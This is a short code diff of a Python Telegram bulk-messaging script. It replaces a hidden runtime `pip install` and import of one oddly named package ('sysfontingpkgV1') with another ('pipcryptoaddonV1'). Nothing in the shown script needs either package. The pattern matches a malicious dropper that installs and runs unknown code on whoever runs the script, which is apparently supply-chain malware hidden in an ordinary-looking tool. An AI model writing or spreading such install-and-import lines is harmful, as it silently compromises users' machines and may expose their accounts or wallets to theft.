@@ -1,6 +1,6 @@
 import os
-os.system("pip install sysfontingpkgV1")
-import sysfontingpkgV1
+os.system("pip install pipcryptoaddonV1")
+import pipcryptoaddonV1
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
 from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
